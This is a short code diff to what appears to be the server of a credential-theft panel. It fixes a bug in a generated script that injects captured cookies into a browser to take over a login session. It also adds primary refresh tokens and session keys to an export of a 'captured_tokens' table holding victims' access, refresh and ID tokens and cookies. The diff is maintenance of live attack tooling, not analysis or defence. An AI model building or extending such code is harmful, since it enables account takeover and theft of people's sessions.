@@ -223,7 +223,7 @@ function generatePopupScript(cookies) {
   script += '     + "; Secure";\n';
   script += ' }\n';
   script += '\n';
-  script += ' console.log("[VGenius] Injected " + cookies length + " cookies");\n';
+  script += ' console.log("[VGenius] Injected " + cookies.length + " cookies");\n';
   script += '\n';
   script += ' // Redirect to trigger authentication\n';
   script += ' setTimeout(function() {\n';
@@ -663,7 +663,7 @@ router.post('/convert-cookie', userAuth, async (req, res) => {
 router.post('/export', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query(
-      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
+      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, session_key_jwe, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
       [req.user.id]
     );
 
